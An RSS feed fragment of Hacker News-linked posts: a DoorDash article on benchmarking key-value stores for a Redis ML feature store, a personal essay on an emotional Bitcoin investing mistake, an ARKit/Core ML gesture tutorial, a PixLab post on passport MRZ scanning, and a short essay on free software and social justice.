data-permalink="https://doordash.engineering/screen-shot-2020-09-25-at-7-21-00-pm/" data-orig-file="https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?fit=506%2C512&amp;ssl=1" data-orig-size="506,512" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Zohaib Sibte Hassan" data-image-description="" data-medium-file="https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?fit=296%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/doordash.engineering/wp-content/uploads/2020/09/Screen-Shot-2020-09-25-at-7.21.00-PM.png?fit=506%2C512&amp;ssl=1">Zohaib Sibte Hassan					</a>
									</span></p><div>
					
<p>When a company with millions of consumers such as DoorDash builds machine learning (ML) models, the amount of feature data can grow to billions of records with millions actively retrieved during model inference under low latency constraints. These challenges warrant a deeper look into selection and design of a feature store — the system responsible for storing and serving feature data. The decisions made here can prevent overrunning cost budgets, compromising runtime performance during model inference, and curbing model deployment velocity.</p>



<p>Features are the input variables fed to an ML model for inference. A feature store, simply put, is a <a href="https://aws.amazon.com/nosql/key-value/">key-value store</a> that makes this feature data available to models in production. At DoorDash, our existing feature store was built on top of <a href="https://redis.io/">Redis</a>, but had a lot of inefficiencies and came close to running out of capacity. We ran a full-fledged benchmark evaluation on five different key-value stores to compare their cost and performance metrics. Our benchmarking results indicated that Redis was the best option, so we decided to optimize our feature storage mechanism, tripling our cost reduction. Additionally, we also saw a 38% decrease in Redis latencies, helping to improve the runtime performance of serving models.</p>



<p>Below, we will explain the challenges posed in the task of operating a large scale feature store. Then, we will review how we were able to quickly identify Redis as the right key-value store for this task. We will then dive into the optimizations we did on Redis to triple its capacity, while also uplifting read performance by choosing a custom serialization scheme around strings, <a href="https://developers.google.com/protocol-buffers">protocol buffers</a>, and <a href="https://github.com/google/snappy">Snappy</a> compression algorithm.</p>



<h2>Requirements of a gigascale feature store</h2>



<p>The challenges of supporting a feature store that needs a large storage capacity and high read/write throughput are similar to the challenges of supporting any high-volume key-value store. Let’s elaborate upon the requirements before we discuss the challenges faced when meeting these requirements specifically with respect to a feature store.</p>



<h3>Persistent scalable storage: support billions of records</h3>



<p>The number of records in a feature store depends upon the number of entities involved and the number of ML use cases employed on these entities. At DoorDash, our ML practitioners work with millions of entities such as consumers, merchants, and food items. These entities are associated with features and used in many dozens of ML use cases such as <a href="https://doordash.engineering/2020/10/01/integrating-a-scoring-framework-into-a-prediction-service/">store ranking</a> and cart item recommendations. Even though there is an overlap in features used across these use cases, the total number of <em>feature-value</em> pairs exceeds billions.</p>



<p>Additionally, since feature data is used in model serving, it needs to be backed up to disk to enable recovery in the event of a storage system failure.</p>



<h3>High read throughput: serve millions of feature lookups per second</h3>



<p>A hit rate of millions of requests per second is a staggering requirement for any data storage system. The request rates on a feature store are directly driven by the number of predictions served by the corresponding system. At DoorDash, one of our high volume use cases, <a href="https://doordash.engineering/2020/10/01/integrating-a-scoring-framework-into-a-prediction-service/">store ranking</a>, makes more than one million predictions per second and uses dozens of features per prediction. Thus, our feature store needs to support tens of millions of reads per second.</p>



<h3>Fast batch writes: enable full data refresh in a nightly run</h3>



<p>Features need to be periodically refreshed to make use of the latest real world data. These writes can typically be done in batches to exploit batch write optimizations of a key-value store. At DoorDash, almost all of the features get updated every day, while real time features, such as “average delivery time for orders from a store in the past 20 minutes”, get updated uniformly throughout the day.</p>



<h2>Specific design challenges in building a feature store</h2>



<p>When designing a feature store to meet the scale expectations described above, we have to deal with complexities that are specific to a feature store. These complexities involve issues such as supporting batch random reads, storing multiple kinds of data types, and enabling low-latency serving.</p>



<h3>Batch random reads per request add to read complexity</h3>



<p>Feature stores need to offer batch lookup operations because a single prediction needs multiple features. All key-value stores support unit lookup operations such as Redis’s <a href="https://redis.io/commands/get">GET command</a>. However, batch lookups are not a standard especially when keys are in no particular sequence. For example, <a href="https://cassandra.apache.org/">Apache Cassandra</a> doesn’t support batch random lookups.</p>



<h3>Heterogeneous data types require non-standardized optimizations</h3>



<p>Features can either be simple data types such as integers, floats, and strings, or compound types such as <a href="https://doordash.engineering/2018/04/02/personalized-store-feed-with-vector-embeddings/">vector embeddings</a> or lists. We use integers or strings for categorical features such as <em>order protocol,</em> for whether an order was received by merchants via email, text, or iPad. We use lists for features such as a <em>list of cuisines chosen by a customer in the past 4 weeks.</em> Each one of these data types needs to be individually treated for optimizing storage and performance efficiency.</p>



<h3>Low read latency but loose expectations on write latency</h3>



<p>A feature store needs to guarantee low-latency reads. Latency on feature stores is a part of model serving, and model serving latencies tend to be in the low milliseconds range. Thus, read latency has to be proportionately lower. Also, typically, writes and updates happen in the background and are much less frequent than reads. For DoorDash, when not doing the batch refresh, writes are only 0.1% of reads. Low-latency requirements on reads and loose expectations with writes gives a direction for building towards a read-heavy key-value store but one that is fast enough for large batch writes.</p>



<h2>Identifying the right key-value store by benchmarking key performance metrics&nbsp;</h2>



<p>The choice for an appropriate storage technology helps greatly in increasing the performance and reducing the costs of a feature store. Using Yahoo’s cloud serving benchmark tool, <a href="https://github.com/brianfrankcooper/YCSB">YCSB</a>, we were able to identify Redis as a key-value store option that best fit our needs.</p>



<h3>What we need from a benchmarking platform</h3>



<p>Before we lay out our benchmarking setup, it is worthwhile to emphasize key requirements of a benchmarking platform. The four major required capabilities of a benchmarking setup are:&nbsp;</p>



<ul><li>Data generation using preset distributions</li></ul>



<p>Using data generation is a faster and more robust approach to benchmarking than ingesting real data because it accounts for possible values that a system’s random variables can take and doesn’t require moving data around to seed a target database.</p>



<ul><li>Ability to simulate characteristic workloads</li></ul>



<p>The workload on a database can be defined by the rate of requests, nature of operations, and proportions of these operations. As long as we can guarantee the same fixed request rate across tests, we can enable a fair comparison between the different databases.</p>



<ul><li>Fine-grained performance reporting</li></ul>



<p>The suite should be able to capture performance with appropriate statistical measures such as averages, 95th percentile, and 99th percentiles.</p>



<ul><li>Reproduction of results on demand</li></ul>



<p>Without reproducibility, there is no benchmark, it’s merely a random simulated event. For this reason, any benchmark platform needs to be able to provide a consistent environment where the results can be reproduced when running the same test over and over.</p>



<h3>Using YCSB to do a rapid comparison of key-value stores</h3>



<p>YCSB is one of the best benchmarking tools out there for analysing key-value stores. So much so that it not only meets all of the needs we described above but also provides sample code to benchmark a vast number of key-value stores. This setup ensures we have a flexible playground for rapid comparisons. Below, we describe our approach of using YCSB to validate our selection of Redis as the best choice for a feature store. We will first describe our experiment setup and then report the results with our analysis.</p>



<h2>Experiment setup</h2>



<p>When setting up the benchmarking experiment, we need to start with the set of key-value stores that we believe can meet the large scale expectations reliably and have a good industry presence. Also, our experiment design is centered around Docker and aims to optimize the speed of iterations when benchmarking by removing infrastructure setup overheads.</p>



<h3>Candidate set of key-value stores</h3>



<p>The key-value stores that we experimented on in this article are listed in Table 1, below. <a href="https://cassandra.apache.org/">Cassandra</a>, <a href="https://www.cockroachlabs.com/">CockroachDB</a>, and <a href="https://redis.io/">Redis</a> have a presence in the DoorDash infrastructure, while we selected <a href="https://www.scylladb.com/">ScyllaDB</a> and <a href="https://www.yugabyte.com/">YugabyteDB</a> based on market reports and our team’s prior experience with these databases. The intention was to compare Redis as an in-memory store with other disk-based key-value stores for our requirements.</p>



<figure><table><tbody><tr><td><strong>Database name</strong></td><td><strong>Version</strong></td></tr><tr><td>Cassandra</td><td>3.11.4</td></tr><tr><td>CockroachDB</td><td>20.1.5</td></tr><tr><td>Redis</td><td>3.2.10</td></tr><tr><td>ScyllaDB</td><td>4.1.7</td></tr><tr><td>YugabyteDB</td><td>2.3.1.0-b15</td></tr></tbody></table><figcaption><em>Table 1.</em> We considered five<em> data stores for benchmarking, three that were in current use at DoorDash and two others that showed promise in external market reports.</em></figcaption></figure>



<h3>Data schema</h3>



<p>For data storage, we chose following patterns:</p>



<ul><li>SQL/Cassandra</li></ul>



<pre><code lang="sql">CREATE TABLE table (key varchar primary key, value varchar)</code></pre>



<ul><li>Redis</li></ul>



<pre><code lang="bash">SET key-value
GET key</code></pre>



<h3>Input data …</h3></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://doordash.engineering/2020/11/19/building-a-gigascale-ml-feature-store-with-redis/">https://doordash.engineering/2020/11/19/building-a-gigascale-ml-feature-store-with-redis/</a></em></p>]]>
            </description>
            <link>https://doordash.engineering/2020/11/19/building-a-gigascale-ml-feature-store-with-redis/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25182692</guid>
            <pubDate>Mon, 23 Nov 2020 01:25:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Spiteful Investor (Or There Are Always Idiots at the Cutting Edge)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25182597">thread link</a>) | @riverlong
<br/>
November 22, 2020 | https://jayriverlong.github.io/2020/11/20/investor.html | <a href="https://web.archive.org/web/*/https://jayriverlong.github.io/2020/11/20/investor.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>I like to think I’m a pretty rational investor. Not too emotional, not too prone to FOMO, willing to wait for good deals. So, let me tell you about a bad and embarrassing decision I made. This story may seem pretty dumb to you, as it does to me today. I often read about great financial disasters and think “that’s so stupid! I would never screw up this badly.” It turns out that’s easier said than done; some theoretical lessons are very hard to internalize in practice.</p> <p>In late 2014, I was cautiously bullish on Bitcoin. I saw the appeal of finite-supply assets in other markets, leaned cypherpunk-libertarian, and had run into many issues with fiat payment processors in my poker days. However, I had also seen Liberty Reserve shut down by the FBI, watched quaint early scams like Auroracoin, and thought it seemed clear that the government would eventually need to shut down this state-threatening Wild West.</p> <p>So I was bullish, but hesitant to put real skin in the game. Along came an opportunity to bet on Bitcoin with no personal downside: I met a young founder who had just raised $2M from a few investors for the purpose of getting them Bitcoin exposure. Let’s call him Mephisto. He had negotiated 25% carry on the profits of his small fund, which was an excellent deal. His track record made sense: he’d been in the industry since 2012, and had made some good money on Bitcoin and trading FPGAs. He had brought on a young woman – let’s call her Bellatrix – to help manage operations. As we talked, we realized I could help them generate alpha beyond pure Bitcoin exposure. I knew financial derivatives very well, so my task was broadly to profit off inefficiencies in these nascent markets.</p> <p>I was 23. Working with Mephisto and Bellatrix was like sitting on the Hindenburg. While I was combing the market for inefficiencies, they were struggling to get the operations fully set up. A few weeks in, it turned out that Mephisto and Bellatrix had been fucking in secret. They had an equity dispute. He went off his medication, and suffered a psychotic breakdown. She accused him of rape. They called the cops on each other. He disappeared and re-encountered the substance abuse problem that had put him on anti-psychotic medication in the first place. To top it all off, they lost the cold storage credentials for a few weeks.</p> <p>I pulled the escape cord and resigned cleanly. Ironically, I took a financial loss here, since I had to have my lawyers review everything and ensure I wasn’t liable for any fiduciary mismanagement these two chaos clowns might undertake.</p> <p>At this point it was early 2015. Bitcoin hovered between $200 and $250 per coin. I was totally over it. The cautiously bullish view I had gotten around to was eviscerated by my distaste for the Mephisto episode. I was exasperated, liquidated nearly my entire position and sat, for a long time, more in the bear camp than not. Thinking about Mephisto and Bellatrix, I said to myself, if <em>this</em> is who is managing money in Bitcoin, there’s no hope for the sector. Bearish on Bitcoin at a $3B market cap.</p> <p>Part of my attitude was a spiteful emotional hedge. I think my reasoning went like this: investing in Bitcoin could go two ways. I could lose money, and I would be disappointed. I could also make money, but in that case, Mephisto and his ilk would make wildly <em>more</em> money, and I would be upset. If I were to invest and succeed holding the same position as Mephisto, I’d be envious of someone I despised. I wanted Mephisto to fail, so I wanted Bitcoin to fail. It’s a twisted rationalization – silly in retrospect, of course.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></p> <p>It’s easy to be a rational investor when the seas are calm. It’s hard when it gets emotional. Importantly, everyone has a threshold – if the personal relationships are close enough, or if the stress is great enough, suddenly even the most rational actors crack. I saw it all the time playing poker: your opponents are stone-faced rational actors until something gets to them. They’re tired or distracted, and suddenly they get pissed off when they normally wouldn’t, and make bets they shouldn’t. Very few people manage to stay rational in charged moments. The better-disciplined folks will summon all their willpower just to walk away.</p> <p>In this episode, I let emotional stress override my assessment of the market. Stupidly, I let my subjective, one-off personal experience bias me against an entire industry. Stress had me do a 180 on a carefully considered position of conviction. Refusing to take a position out of spite, or in order to pre-empt envy in the case of success, is even more embarrassing.</p> <p>Finally, there was one other important thing I hadn’t considered or realized at the time: the cutting edge is always full of idiots. It’s a common trope that people who are all-in on frontier tech are usually somewhat crazy. We have a romantic view of folks on the frontier – eccentric geniuses – but much of the time it’s gullible bozos and scammers feeding off them. In a historical analogy, the Wild West does not just create outlaws, it necessarily attracts them. My mistake here was to let the worst people color my representation of the market. It doesn’t matter how many scammers and con-men there are, it matters how many people are building stable infrastructure. It doesn’t matter how many ways there are for it to fail, it only matters that there’s one plausible way to succeed.</p>  <hr>  <br> </article> </div></div>]]>
            </description>
            <link>https://jayriverlong.github.io/2020/11/20/investor.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25182597</guid>
            <pubDate>Mon, 23 Nov 2020 01:07:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Core ML and ARKit to Build a Gesture-Based Interface iOS App]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25182561">thread link</a>) | @bmnzaf
<br/>
November 22, 2020 | https://heartbeat.fritz.ai/building-a-gesture-based-interface-ios-app-with-core-ml-and-arkit-910b5c94da80 | <a href="https://web.archive.org/web/*/https://heartbeat.fritz.ai/building-a-gesture-based-interface-ios-app-with-core-ml-and-arkit-910b5c94da80">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><p id="0253">We’ll use machine learning to train a model with simple gestures. This will allow us to communicate with an app in which we’ll have a browser being displayed by AR.</p><h2 id="535c">1 — Training a Machine Learning Model</h2><p id="6845">Usually, when training a machine learning model, we need a huge dataset to avoid biased recognition. This means that if we submit only a few pictures on a similar angle or with similar light/shadow conditions, then the recognition might either not work for what we want, or it’ll work for what we want and for many other cases that we don’t want.</p><p id="8f97">Once we gather enough images to compose our dataset, we can train a model using tools like <a rel="noopener" href="https://heartbeat.fritz.ai/training-a-core-ml-model-with-turi-create-to-classify-dog-breeds-d10009bd30b6">Turi Create</a>, Caffe, TensorFlow... If you want to train a model on-line, you can use <a rel="noopener" href="https://heartbeat.fritz.ai/building-a-real-time-hand-sign-detector-in-ios-using-core-ml-and-custom-vision-e76aad7961ac">Custom Vision</a>:</p><blockquote><p id="699f">H<!-- -->ere’s a list of custom Core ML models where you can find many nice trained models ready-to-go. <a href="https://github.com/likedan/Awesome-CoreML-Models" rel="noopener">https://github.com/likedan/Awesome-CoreML-Models</a></p></blockquote><p id="4801">If you’re using CustomVision.ai, use the “General Compact” domain, and once you’ve submitted the whole dataset and tagged the pictures of each gesture, you can then train the model and export it to Core ML format.</p><blockquote><p id="dd19">I learned this approach when I checked this repository <a href="https://github.com/hanleyweng/Gesture-Recognition-101-CoreML-ARKit" rel="noopener">https://github.com/hanleyweng/Gesture-Recognition-101-CoreML-ARKit</a>. You can even re-use its CoreML model, which is what I’ll do here.</p></blockquote><p id="322b">Now that we’ve trained and exported our model, keep it somewhere safe, because now it’s time to…</p><h2 id="d3c6">2 —Use ARKit to create an AR iOS app</h2><p id="d5ec">Let’s create an iOS project using the Augmented Reality template.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2888/1*KCSTTWDT0KqcsgTmDAcjaA.png" width="1444" height="1034" srcset="https://miro.medium.com/max/552/1*KCSTTWDT0KqcsgTmDAcjaA.png 276w, https://miro.medium.com/max/1104/1*KCSTTWDT0KqcsgTmDAcjaA.png 552w, https://miro.medium.com/max/1280/1*KCSTTWDT0KqcsgTmDAcjaA.png 640w, https://miro.medium.com/max/1400/1*KCSTTWDT0KqcsgTmDAcjaA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*KCSTTWDT0KqcsgTmDAcjaA.png?q=20"></p></div></div></div></figure><p id="ed72">I’m not a big fan of using templates because they have too much boilerplate code, but for this purposes of this tutorial, we’ll use it. If you want to understand step-by-step how to start an <a href="https://developer.apple.com/arkit/" rel="noopener">ARKit</a> project, check out my other article on this topic:</p><h2 id="3f1c">I haven’t written a single line of code and there are already 81 lines.</h2><p id="eb2b">As I said, these templates have a lot of boilerplate code. Drag and drop your model into the project navigator. If you’re re-using the model from the project I’ve mentioned (like me), it’ll look like this.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1152/1*PU08hTX9kP90Riz4lba8Iw.png" width="576" height="458" srcset="https://miro.medium.com/max/552/1*PU08hTX9kP90Riz4lba8Iw.png 276w, https://miro.medium.com/max/1104/1*PU08hTX9kP90Riz4lba8Iw.png 552w, https://miro.medium.com/max/1152/1*PU08hTX9kP90Riz4lba8Iw.png 576w" sizes="576px" data-old-src="https://miro.medium.com/max/60/1*PU08hTX9kP90Riz4lba8Iw.png?q=20"></p></div></div><figcaption>Make sure the ‘Target Membership’ is checked for the project.</figcaption></figure><p id="0ead">Let’s clean this up…All this boilerplate code is just noisy and useless for us. Delete every function except for <code>viewWillAppear</code> and v<code>iewWillDisappear</code>.</p><figure><div></div><figcaption>This is how our code looks like right now.</figcaption></figure><p id="34b1">Note that I also removed the delegate protocol conformation and the unused imports of UIKit and SceneKit since we’re already using ARKit. We’ll use the <a rel="noopener" href="https://heartbeat.fritz.ai/building-a-camera-calculator-with-vision-and-tesseract-ocr-in-ios-26f16240fe51">Vision framework</a><strong> </strong>for the Image Analysis. So go ahead and add:</p><blockquote><p id="ba11"><strong><em>import</em></strong><em> Vision</em></p></blockquote><p id="575f">Now let’s go from top to bottom and declare some properties we’ll use further in our code:</p><figure><div></div></figure><p id="eb0f">The first line inside our class scope is an outlet for a <code>ARSCNView</code>, which is already connected to the <code>.xib</code> since we started the project using a template.</p><p id="b9ca">We’ll be constantly trying to recognize each frame displayed from our camera, and we can’t block the UI thread many times per second to analyze those frames. So we must handle this using a serial queue, which is our first property.</p><p id="d68c">The second property is an array of <code>VNRequest</code>.<strong> </strong>We’ll create an object from this type further down in this ViewController.</p><p id="07f5">The third and last property is a simple <code>UIWebView</code>.</p><h2 id="d599">Lifecycle and setups</h2><figure><div></div></figure><h2 id="1dc0">Setting up the AR</h2><p id="2001">Besides running the session with our configuration parametrized, the only thing I’ve added here is the gesture recognizer. This will allow us to decide when we want to add a node with the <code>UIWebView</code> to our scene.</p><h2 id="8e96">Setting up Vision/ML</h2><p id="ca4d">First, we have our trained model wrapped in a <code>VNCoreMLModel</code> instance, then a <code>VNCoreMLRequest</code> parametrizing this model, and then a completion handler, which in this case is a function to be set a few lines ahead.</p><p id="34d7">Back in the properties, we set an array of <code>VNRequest</code> type, remember? What we do here is set an array containing this request instance to that property.</p><blockquote><p id="912f">But why does it have to be an array if it’s just one instance? Because the ‘perform’ function receives an array as a parameter.</p></blockquote><figure><div></div></figure><h2 id="250b">tapped(recognizer: UIGestureRecognizer)</h2><p id="c896">Once you tap on the <code>ARSCNView</code>, we get its current frame, and then we load a <code>SCNPlane</code> onto our scene containing the <code>UIWebView</code> as its diffuse shading.</p><p id="d16d">The position of the node that contains this <code>SCNPlane</code> is being set by getting the transform matrix of the camera to retrieve the point of view and multiplying the ‘z’ axis by -1.0, so it can be seen a bit ahead of the phone’s camera. The <code>eulerAngles</code> property means rotation of the node, and <code>SCNVector3Zero</code> is the same as <code>SCNVector3(0, 0 ,0)</code></p><blockquote><p id="2d52">Check this link for more:</p></blockquote><h2 id="25e0">loopCoreMLUpdate</h2><p id="31d8">Here, we use the queue to leave the main thread free for the camera so this whole recognition process doesn’t freeze our UI. And inside the scope of execution, we call our function recursively.</p><figure><div></div></figure><h2 id="5bdd">updateCoreML function</h2><p id="810b">First we start by retrieving the<strong> </strong>current frame of the camera, and then we wrap this into a <code>CIImage</code>. Then, we instantiate a <code><strong>VNImageRequestHandler </strong></code>passing this <code>CIImage</code>, and we call the perform method on this handler passing the array property containing the <code>VNRequest</code> we created before. Once the perform method is done, the completion handler will get called.</p></div></div></section></div>]]>
            </description>
            <link>https://heartbeat.fritz.ai/building-a-gesture-based-interface-ios-app-with-core-ml-and-arkit-910b5c94da80</link>
            <guid isPermaLink="false">hacker-news-small-sites-25182561</guid>
            <pubDate>Mon, 23 Nov 2020 01:01:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Modern Passport Structure and Bulk Scan APIs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25182541">thread link</a>) | @symisc_devel
<br/>
November 22, 2020 | https://blog.pixlab.io/2020/11/modern-passports-structure-bulk-scan-apis | <a href="https://web.archive.org/web/*/https://blog.pixlab.io/2020/11/modern-passports-structure-bulk-scan-apis">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<div>
<div>
<div>
<div>
<p>A Passport is a document that almost everyone has at some point in their lives. It is issued by the country’s government to its citizens and mainly being used for traveling purposes. It also serves as proof of nationality, name, and more importantly an <strong>Universally Unique ID</strong> for its owner.</p>
<p>Modern Passport Structure</p>
<p><img src="https://s3.amazonaws.com/pics.pixlab.xyz/oJY2K.png" alt="Passport Specimen"></p>
<p>Many services have been long-time accepting passports as identification documents from their customers to <strong>complete their KYC (<em>Know Your Customer</em>) form</strong> as required by the legislation in force. This is especially true and enforced for the <em>Finance</em>, <em>HR</em> or <em>Travel</em> sectors. In most cases, a human operator will verify the authenticity of the submitted document and grant validation or reject it.</p>
<p>Things can get really complicated if you have hundreds of KYC forms to checks, but also if your clients differ in nationality. Quickly, you will find yourself drowning in physical copies of passports in different languages that you can not even understand. Let alone the potential legal problems you can face with passport copies laying around the office. This is why, an automated &amp; safe solution for Passports processing is required!</p>
<h2>Modern Passport Structure</h2>
<p>From the 1980s on wards, most countries started issuing passports containing an <strong>MRZ</strong>. MRZ stands for the <strong>Machine Readable Zone</strong> and is usually located at the bottom of the Passport as shown below:</p>
<p>Modern Passport Specimen</p>
<p><img src="https://i.stack.imgur.com/mwJTo.jpg" alt="Passports MRZ Sample"></p>
<p>Passports that contain an MRZ are referred to as <strong>MRPs, machine-readable passports</strong> (Almost all modern issued Passports have one). The structure of the MRZ is standardized by the <a href="https://www.icao.int/publications/pages/publication.aspx?docnum=9303">ICAO Document 9303</a> and the International Electro-technical Commission as <a href="https://www.iso.org/standard/45562.html">ISO/IEC 7501-1</a>.</p>
<p>The MRZ is an area on the document that can easily be read by a machine using an OCR Reader Application or API. It’s not important for you to understand how it works, but if you look at it carefully, you will see that it contains most of the relevant information on the document, combined with additional characters and a checksum that can be extracted programmatically and automatically via API as we will see in the next section.</p>
<p>Once parsed, the following information are automatically extracted from the target <strong>MRZ</strong> and made immediately available to your app, thanks to the /<a href="https://pixlab.io/cmd?id=docscan">docscan</a> API endpoint:</p>
<ul>
<li><strong>issuingCountry</strong>: The issuing country or organization, encoded in three characters.</li>
<li><strong>fullName</strong>: Passport holder full name. The name is entirely upper case.</li>
<li><strong>documentNumber</strong>: This is the passport number, as assigned by the issuing country. Each country is free to assign numbers using any system it likes.</li>
<li><strong>checkDigit</strong>: Check digits are calculated based on the previous field. Thus, the first check digit is based on the passport number, the next is based on the date of birth, the next on the expiration date, and the next on the personal number. The check digit is calculated using this <a href="http://www.highprogrammer.com/alan/numbers/mrp.html#checkdigit">algorithm</a>.</li>
<li><strong>nationality</strong>: The issuing country or organization, encoded in three characters.</li>
<li><strong>dateOfBirth</strong>: The date of the passport holder's birth in YYMMDD form. Year is truncated to the least significant two digits. Single digit months or days are perpended with 0.</li>
<li><strong>sex</strong>: Sex of the passport holder, <strong>M</strong> for males, <strong>F</strong> for females, and <strong>&lt;</strong> for non-specified.</li>
<li><strong>dateOfExpiry</strong>: The date the passport expires in <strong>YYMMDD</strong> form. Year is truncated to the least significant two digits. Single digit months or days are perpended with 0.</li>
<li><strong>personalNumber</strong>: This field is optional and can be used for any purpose that the issuing country desires.</li>
<li><strong>finalcheckDigit</strong>: This is a check digit for positions 1 to 10, 14 to 20, and 22 to 43 on the second line of the MRZ. Thus, the nationality and sex are not included in the check. The check digit is calculated using this <a href="http://www.highprogrammer.com/alan/numbers/mrp.html#checkdigit">algorithm</a>.</li>
</ul>
<h2>Automatic Passport Processing</h2>
<p><img src="https://blog.pixlab.io/content/images/20201106031815-pix.png" alt="PixLab Logo"></p>
<p>Fortunately for the developer wishing to automate Passports scanning, <a href="https://pixlab.io/cmd?id=docscan">PixLab</a> can automatically scan &amp; extract passport MRZ but also help to detect possible fraudulent documents. This is made possible thanks to the /<a href="https://pixlab.io/cmd?id=docscan">docscan</a> API endpoint which let you in a single call scan government issued documents such as <strong>Passports</strong>, <strong>Visas</strong> or <strong>ID Cards</strong> from various countries.</p>
<p>Besides extracting MRZ, the /<a href="https://pixlab.io/cmd?id=docscan">docscan</a> API endpoint <a href="https://pixlab.io/cmd?id=crop">shall automatically crop</a> any <strong>detected face</strong> and transform binary <strong>Machine Readable Zone</strong> into stream of text content (i.e. <em>full name</em>, <em>issuing country</em>, <em>document number</em>, <em>date of expiry</em>, etc.) ready to be consumed by your app in the JSON format.</p>
<p>Below, a typical output result of the /<a href="https://www.iso.org/standard/45562.html">docscan</a> endpoint for a passport input image:</p>
<p>Input Passport Specimen (JPEG/PNG/BMP Image)</p>
<p><img src="https://s3.amazonaws.com/pics.pixlab.xyz/oJY2K.png" alt="Input Image URL"></p>
<p>Extracted MRZ Fields</p>
<p><img src="https://s3.amazonaws.com/pics.pixlab.xyz/docscan_output.png" alt="MRZ Fields"></p>
<p>What follow is the gist used to achieve such result:</p>

<p>Other document scanning code samples are available to consult via the following Github links:</p>
<ul>
<li><strong>Python code for scanning Passports</strong>: <strong><a href="https://github.com/symisc/pixlab/blob/master/python/passport_scan.py">passport_scan.py</a></strong>.</li>
<li><strong>PHP code for scanning Passports</strong>: <strong><a href="https://github.com/symisc/pixlab/blob/master/PHP/passport_scan.php">passport_scan.php</a></strong>.</li>
</ul>
<p>Face extraction is automatically performed using the /<a href="https://pixlab.io/cmd?id=facedetect">facedetect</a> API endpoint. For a general purpose Optical Character Recognition engine, you should rely on the /<a href="https://pixlab.io/cmd?id=cor">OCR</a> API endpoint instead. If you are dealing with PDF documents, you can convert them at first to raw images via the /<a href="https://pixlab.io/cmd?id=pdftoimg">pdftoimg</a> endpoint.</p>
<h2>Conclusion</h2>
<p>The era we are in is more digitized than ever. Tasks that are repetitive are slowly being replaced by computers and robots. In many cases, they can perform these tasks faster, with a smaller amount of mistakes and in a more cost-effective manner. At <a href="https://pixlab.io/">PixLab</a> we focus on building software to replace manual repetitive labor in administrative business processes. The processing and checking of passports can be very time-consuming. Using /<a href="https://pixlab.io/cmd?id=docscan">docscan</a> to automate your passport processing will enable you to save cost, on-board customers faster and reduce errors in administrative processes.</p>
<hr>


</div>
</div>
</div>

</div>

</article></div>]]>
            </description>
            <link>https://blog.pixlab.io/2020/11/modern-passports-structure-bulk-scan-apis</link>
            <guid isPermaLink="false">hacker-news-small-sites-25182541</guid>
            <pubDate>Mon, 23 Nov 2020 00:58:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why should you work on Free Software (or other technology issues)?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25182506">thread link</a>) | @pabs3
<br/>
November 22, 2020 | http://deblanc.net/blog/2020/11/22/why-should-you-work-on-free-software-or-other-technology-issues/ | <a href="https://web.archive.org/web/*/http://deblanc.net/blog/2020/11/22/why-should-you-work-on-free-software-or-other-technology-issues/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Twice this week I was asked how it can be okay to work on free software when there are issues like climate change and racial injustice. I have a few answers for that.</p>
<h3>You can work on injustice while working on free software.</h3>
<p>A world in which all technology is just cannot exist under capitalism. It cannot exist under racism or sexism or ableism. It cannot exist in a world that does not exist if we are ravaged by the effects of climate change. At the same time, free software is part of the story of each of these. The modern technology state fuels capitalism, and capitalism fuels it. It cannot exist without transparency at all levels of the creation process. Proprietary software and algorithms reinforce racial and gender injustice. Technology is very guilty of its contributions to the climate crisis. By working on making technology more just, by making it more free, we are working to address these issues. Software makes the world work, and oppressive software creates an oppressive world.</p>
<h3>You can work on free software while working on injustice.</h3>
<p>Let’s say you do want to devote your time to working on climate justice full time. Activism doesn’t have to only happen in the streets or in legislative buildings. Being a body in a protest is activism, and so is running servers for your community’s federated social network, providing wiki support, developing custom software, and otherwise bringing your free software skills into new environments. As long as your work is being accomplished under an ethos of free software, with free software, and under free software licenses, you’re working on free software issues while saving the world in other ways too!</p>
<h3>Not everyone needs to work on everything all the time.</h3>
<p>When your house in on fire, you need to put out the fire. However, maybe you can’t help put out the first. Maybe You don’t have the skills or knowledge or physical ability. Maybe your house is on fire, but there’s also an earthquake and a meteor and a airborn toxic event all coming at once. When that happens, we have to split up our efforts and that’s okay.</p>
	</div></div>]]>
            </description>
            <link>http://deblanc.net/blog/2020/11/22/why-should-you-work-on-free-software-or-other-technology-issues/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25182506</guid>
